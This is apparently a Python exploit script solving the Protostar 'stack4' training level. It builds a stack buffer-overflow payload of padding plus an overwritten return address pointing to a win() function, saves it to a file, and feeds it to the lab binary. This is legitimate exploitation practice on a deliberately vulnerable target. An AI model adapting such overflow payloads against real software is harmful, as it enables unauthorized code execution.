from subprocess import call
import os.path
import sys
import struct


# ============================= make_exploit =============================
def make_exploit():
    """This is our BOF input"""
    
    padding = b'AAAA'*19
    eip = struct.pack('I', 0x80483f4) # win() at 0x80483f4
    exploit = (padding + eip)
    return exploit


# ============================= print_exploit =============================
def print_exploit(exploit):
    """Prints a representation of the exploit input"""

    cont = 0
    print('='*20 + 'Exploit' + '='*20)
    while cont < len(exploit):
        sys.stdout.write('{0:<8}: '.format(hex(cont) ))
        sys.stdout.write(' '.join( [x for x in exploit[cont:cont+16]] ) + '\n')
        cont += 0x10
    print('='*47 + '\n')


# ============================= save_exploit =============================
def save_exploit(exploit_filename, exploit):
    """Saves exploit input data to a file at the same directory of this script (__file__)"""

    print('\n[X] Saving: {0}...\n'.format(exploit_filename))
    print_exploit(exploit)
    dir_path = os.path.dirname('./' + sys.argv[0])
    full_path = dir_path + '/' + exploit_filename
    with open(full_path, 'wb') as exploit_file:
        exploit_file.write(exploit)


# ============================= evil =============================
def evil(exploit_filename, level_path):
    """call level_path and run the exploit"""

    print('\n[X] Exploiting: {0}\n'.format(level_path))
    cli = level_path
    dir_path = os.path.dirname('./' + sys.argv[0])
    full_path = dir_path + '/' + exploit_filename
    with open(full_path, 'rb') as exploit_file:
        call(cli, shell=True, stdin=exploit_file)


# ============================= S T A R T =============================
if __name__ == '__main__':
    exploit_filename = 'exploit_stack4'
    level_path = '/opt/protostar/bin/stack4'
    try:
        if sys.argv[1] == '-s' or sys.argv[1] == '--save':
            exploit = make_exploit()
            save_exploit(exploit_filename, exploit)
        else:
            print('Error: bad option.\
            \n\n\trun:\n\t{0} [-s | --save]\    # to save exploit file\n'.format(sys.argv[0]))

            print('\tor just run: \n\t{0}    # to exploit `{1}`\n'.format(sys.argv[0], level_path))
    except:
        exploit = make_exploit()
        save_exploit(exploit_filename, exploit)
        evil(exploit_filename, level_path)
            